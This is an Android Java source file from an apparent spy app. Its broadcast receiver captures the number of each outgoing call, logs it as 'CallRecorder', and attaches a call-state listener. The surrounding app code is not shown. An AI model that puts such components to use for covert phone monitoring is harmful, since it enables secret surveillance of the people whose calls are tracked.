package com.app.spyapp.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.telephony.PhoneStateListener;
import android.util.Log;

import com.app.spyapp.SpyApp;

public class CallBroadcastReceiver extends BroadcastReceiver {
    private SpyApp spyApp;

    public void onReceive(Context context, Intent intent) {
        spyApp = (SpyApp) context.getApplicationContext();
        Log.d("CallRecorder", "CallBroadcastReceiver::onReceive got Intent: " + intent.toString());
        if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            String numberToCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            spyApp.setOutgoingnumber(numberToCall);
            Log.d("CallRecorder", "CallBroadcastReceiver intent has EXTRA_PHONE_NUMBER: " + numberToCall);
        }

        PhoneListener phoneListener = new PhoneListener(context);
        TelephonyManager telephony = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);
        telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
    }
}
